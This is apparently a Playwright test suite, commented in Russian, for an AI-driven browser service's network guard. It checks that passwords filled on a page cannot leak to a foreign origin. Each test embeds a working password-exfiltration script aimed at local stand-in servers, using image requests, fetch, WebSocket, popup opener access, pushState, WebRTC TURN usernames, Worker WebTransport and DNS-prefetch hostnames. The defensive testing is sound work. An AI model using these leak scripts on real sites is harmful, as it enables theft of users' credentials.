import { randomBytes } from 'node:crypto'
import { createSocket } from 'node:dgram'
import { mkdtempSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { createServer as createNetServer, type AddressInfo } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Readable } from 'node:stream'
import { expect, test } from '@playwright/test'
import { installNetworkGuard } from '../../src/guard/index.js'
import { startBrowserService } from '../../src/service/start.js'
import { loginVaultPath, openLoginVault } from '../../src/vault/index.js'
import { refOf, type BrowserResult } from './helpers.js'

// Скрипт на разрешённом сайте читает вписанный пароль и уносит его на чужой сайт запросом GET (картинка, fetch,
// WebSocket). Пока пароль на странице, запросы на сайты вне allowedOrigins закрыты; на новой странице — снова открыты.

const PASSWORD = `exfil-${randomBytes(8).toString('hex')}`

async function listen(server: Server): Promise<string> {
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  return `http://127.0.0.1:${(server.address() as AddressInfo).port}`
}

test('пароль на странице не уходит на чужой сайт ни картинкой, ни fetch, ни WebSocket', async () => {
  const stolen: string[] = []
  const foreign = createServer((request, response) => {
    stolen.push(request.url ?? '')
    response.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' })
    response.end()
  })
  foreign.on('upgrade', (request, socket) => {
    stolen.push(`ws:${request.url ?? ''}`)
    socket.destroy()
  })
  // Чужой сайт — тот же адрес, но через `localhost`: другой origin.
  const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')

  const leakScript = `
    const steal = (value) => {
      new Image().src = '${foreignUrl}/img?p=' + encodeURIComponent(value)
      fetch('${foreignUrl}/fetch?p=' + encodeURIComponent(value), { mode: 'no-cors' }).catch(() => {})
      try { new WebSocket('${foreignUrl.replace('http', 'ws')}/ws?p=' + encodeURIComponent(value)) } catch {}
    }
    document.querySelector('input[type=password]')?.addEventListener('input', (event) => steal(event.target.value))
  `
  const site = createServer((request, response) => {
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    if (request.url === '/login') {
      response.end(`<!doctype html><title>Вход</title><label>Пароль <input type="password" name="password"></label><script>${leakScript}</script>`)
    } else {
      response.end(`<!doctype html><title>Кабинет</title><img src="${foreignUrl}/after-login.gif">`)
    }
  })
  const siteUrl = await listen(site)

  const dataDir = mkdtempSync(join(tmpdir(), 'remontnik-browser-exfil-'))
  const vaultKey = randomBytes(32)
  const entry = await openLoginVault({ file: loginVaultPath(dataDir), key: vaultKey }).add({ site: siteUrl, login: 'owner', profile: 'remontnik' }, Readable.from([Buffer.from(PASSWORD)]))
  const logs: string[] = []
  const token = randomBytes(24).toString('hex')
  const service = await startBrowserService({
    token,
    vaultKey,
    dataDir,
    policy: { allowedOrigins: [siteUrl], allowedMutations: [], profiles: [{ name: 'remontnik' }] },
    listen: { host: '127.0.0.1', port: 0 },
    live: null,
    log: (line) => logs.push(line),
  })
  const call = async (command: string, body: Record<string, unknown> = {}): Promise<BrowserResult> => {
    const response = await fetch(`${service.url}/v1/${command}`, {
      method: 'POST',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ profile: 'remontnik', ...body }),
    })
    return (await response.json()) as BrowserResult
  }

  try {
    const login = await call('url', { url: `${siteUrl}/login` })
    expect(login).toMatchObject({ ok: true, title: 'Вход' })
    // Пароль вписан, но страница пыталась унести его: действие сообщает об этом модели, как о любом запросе под замком.
    expect(await call('fill-password', { entryId: entry.id, ref: refOf(login.snapshot, 'textbox', 'Пароль') })).toMatchObject({ ok: false, code: 'refused_leak' })

    await expect.poll(() => logs.filter((line) => line.includes('refused_leak')).length).toBeGreaterThanOrEqual(2)
    // Сокет мог бы прийти чуть позже запросов: ждём, пока страница точно успела попытаться.
    await call('read')
    expect(stolen).toEqual([])

    // Новая страница без пароля: подресурсы с других сайтов снова грузятся.
    expect(await call('url', { url: `${siteUrl}/cabinet` })).toMatchObject({ ok: true, title: 'Кабинет' })
    await expect.poll(() => stolen).toEqual(['/after-login.gif'])
  } finally {
    await service.close()
    site.close()
    foreign.close()
  }
})

test('окно того же сайта не уносит пароль: замок — на весь контекст, пока заперта хоть одна страница', async ({ browser }) => {
  const stolen: string[] = []
  const foreign = createServer((request, response) => {
    stolen.push(request.url ?? '')
    response.writeHead(200, { 'content-type': 'image/gif' })
    response.end()
  })
  const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')

  // Новое окно того же сайта читает пароль через opener и уносит его уже от себя.
  const leakScript = `
    document.querySelector('input[type=password]')?.addEventListener('input', () => window.open('/popup', 'reader'))
  `
  const popupScript = `
    const value = window.opener?.document.querySelector('input[type=password]')?.value
    if (value) new Image().src = '${foreignUrl}/opener?p=' + encodeURIComponent(value)
  `
  const site = createServer((request, response) => {
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    if (request.url === '/popup') response.end(`<!doctype html><title>Окно</title><script>${popupScript}</script>`)
    else if (request.url === '/cabinet') response.end(`<!doctype html><title>Кабинет</title><img src="${foreignUrl}/after-login.gif">`)
    else response.end(`<!doctype html><title>Вход</title><input type="password" name="password"><script>${leakScript}</script>`)
  })
  const siteUrl = await listen(site)

  // Сам замок, без сервиса: сервис ещё и закрывает новые окна, но не мгновенно — окно успевает сделать запрос.
  const context = await browser.newContext()
  const blocked: string[] = []
  const guard = await installNetworkGuard(context, { allowedOrigins: [siteUrl], allowedMutations: [] }, (request) => blocked.push(request.code))
  try {
    const page = await context.newPage()
    await page.goto(`${siteUrl}/login`)
    guard.passwordFilled(page)
    await page.fill('input[type=password]', PASSWORD)
    await expect.poll(() => context.pages().some((opened) => opened.url().endsWith('/popup'))).toBe(true)
    const reader = context.pages().find((opened) => opened.url().endsWith('/popup'))!
    await reader.waitForLoadState('load')
    await expect.poll(() => blocked.filter((code) => code === 'refused_leak').length).toBeGreaterThanOrEqual(1)

    // Страница с паролем ушла на новый документ, окно живо — замок держится: картинка кабинета и поздний запрос окна закрыты.
    await page.goto(`${siteUrl}/cabinet`)
    await reader.evaluate((url) => void (new Image().src = `${url}/late`), foreignUrl)
    await expect.poll(() => blocked.length).toBeGreaterThanOrEqual(3)
    expect(stolen).toEqual([])

    // Окна закрыты — на новом документе замок снят.
    for (const other of context.pages()) if (other !== page) await other.close()
    await page.goto(`${siteUrl}/cabinet`)
    await expect.poll(() => stolen).toEqual(['/after-login.gif'])
  } finally {
    await context.close()
    site.close()
    foreign.close()
  }
})

// Уход без нового документа: адрес страницы меняется, а пароль остаётся в DOM. Замок держится до нового документа.
for (const [label, leave] of [
  ['204 и pushState', `location.href = '/nocontent'`],
  ['stop() и pushState', `location.href = '/slow'; setTimeout(() => window.stop(), 100)`],
  ['скачивание и pushState', `location.href = '/download'`],
] as const) {
  test(`пароль не уходит после ухода без нового документа: ${label}`, async ({ browser }) => {
    const stolen: string[] = []
    const foreign = createServer((request, response) => {
      stolen.push(request.url ?? '')
      response.writeHead(200, { 'content-type': 'image/gif' })
      response.end()
    })
    const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')
    const leakScript = `
      document.querySelector('input[type=password]')?.addEventListener('input', (event) => {
        const value = event.target.value
        ${leave}
        setTimeout(() => {
          history.pushState({}, '', '/moved')
          new Image().src = '${foreignUrl}/after?p=' + encodeURIComponent(value)
        }, 1500)
      })
    `
    const site = createServer((request, response) => {
      if (request.url === '/nocontent') return void response.writeHead(204).end()
      if (request.url === '/slow') return void setTimeout(() => response.writeHead(200, { 'content-type': 'text/html' }).end('<title>Долго</title>'), 5_000)
      if (request.url === '/download') return void response.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename="x.bin"' }).end('x')
      response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
      response.end(`<!doctype html><title>Вход</title><input type="password" name="password"><script>${leakScript}</script>`)
    })
    const siteUrl = await listen(site)
    const context = await browser.newContext({ acceptDownloads: false })
    const blocked: string[] = []
    const guard = await installNetworkGuard(context, { allowedOrigins: [siteUrl], allowedMutations: [] }, (request) => blocked.push(request.code))
    try {
      const page = await context.newPage()
      await page.goto(`${siteUrl}/login`)
      guard.passwordFilled(page)
      await page.fill('input[type=password]', PASSWORD)
      await expect.poll(() => blocked.length + stolen.length, { timeout: 10_000 }).toBeGreaterThan(0)
      expect(stolen).toEqual([])
      expect(blocked).toContain('refused_leak')
    } finally {
      await context.close()
      site.close()
      foreign.close()
    }
  })
}

// Каналы мимо перехвата запросов: WebRTC (TURN с паролем в имени пользователя), WebTransport из фонового скрипта,
// пароль в имени хоста (предварительное соединение). Ни один пакет не должен дойти до чужого сервера.
test('мимо перехвата пароль не уходит: WebRTC, WebTransport из Worker, имя хоста', async ({ browser }) => {
  const tcp: string[] = []
  const tcpServer = createNetServer((socket) => {
    tcp.push('соединение')
    socket.on('error', () => {})
  })
  await new Promise<void>((resolve) => tcpServer.listen(0, '127.0.0.1', resolve))
  const tcpPort = (tcpServer.address() as AddressInfo).port
  const udp: number[] = []
  const udpServer = createSocket('udp4')
  udpServer.on('message', (message) => udp.push(message.length))
  await new Promise<void>((resolve) => udpServer.bind(0, '127.0.0.1', resolve))
  const udpPort = udpServer.address().port
  const site = createServer((_request, response) => {
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    response.end('<!doctype html><title>Вход</title><input type="password" name="password">')
  })
  const siteUrl = await listen(site)
  const context = await browser.newContext()
  const guard = await installNetworkGuard(context, { allowedOrigins: [siteUrl], allowedMutations: [] }, () => {})
  try {
    const page = await context.newPage()
    await page.goto(siteUrl)
    guard.passwordFilled(page)
    await page.fill('input[type=password]', PASSWORD)
    const tried = await page.evaluate(
      async ({ tcpPort, udpPort }) => {
        const value = (document.querySelector('input[type=password]') as HTMLInputElement).value
        const outcome: Record<string, string> = {}
        for (const rel of ['preconnect', 'dns-prefetch']) {
          for (const host of [`${value}.localhost`, '127.0.0.1']) {
            const link = document.createElement('link')
            link.rel = rel
            link.href = `http://${host}:${tcpPort}`
            document.head.append(link)
          }
        }
        // Чистое окно рядом: в нём свои конструкторы.
        const frame = document.createElement('iframe')
        document.body.append(frame)
        const windows = [window, frame.contentWindow!] as unknown as Array<Record<string, unknown>>
        for (const [index, scope] of windows.entries()) {
          for (const transport of ['udp', 'tcp']) {
            try {
              const Connection = scope['RTCPeerConnection'] as typeof RTCPeerConnection
              const connection = new Connection({
                iceServers: [{ urls: `turn:127.0.0.1:${transport === 'udp' ? udpPort : tcpPort}?transport=${transport}`, username: value, credential: value }],
                iceTransportPolicy: 'relay',
              })
              connection.createDataChannel('leak')
              await connection.setLocalDescription(await connection.createOffer())
              outcome[`rtc-${index}-${transport}`] = 'создан'
            } catch (error) {
              outcome[`rtc-${index}-${transport}`] = String(error).slice(0, 60)
            }
          }
        }
        const source = `try { new WebTransport('https://127.0.0.1:${udpPort}/' + ${JSON.stringify(value)}); postMessage('создан') } catch (error) { postMessage(String(error).slice(0, 60)) }`
        for (const url of [URL.createObjectURL(new Blob([source])), `data:text/javascript,${encodeURIComponent(source)}`]) {
          const worker = new Worker(url)
          outcome[`worker-${url.slice(0, 4)}`] = await new Promise<string>((resolve) => {
            worker.onmessage = (event) => resolve(String(event.data))
            worker.onerror = () => resolve('ошибка')
            setTimeout(() => resolve('молчит'), 3_000)
          })
        }
        await new Promise((resolve) => setTimeout(resolve, 2_500))
        return outcome
      },
      { tcpPort, udpPort },
    )
    expect(Object.values(tried)).not.toContain('создан')
    expect({ tcp, udp }).toEqual({ tcp: [], udp: [] })
  } finally {
    await context.close()
    site.close()
    tcpServer.close()
    udpServer.close()
  }
})
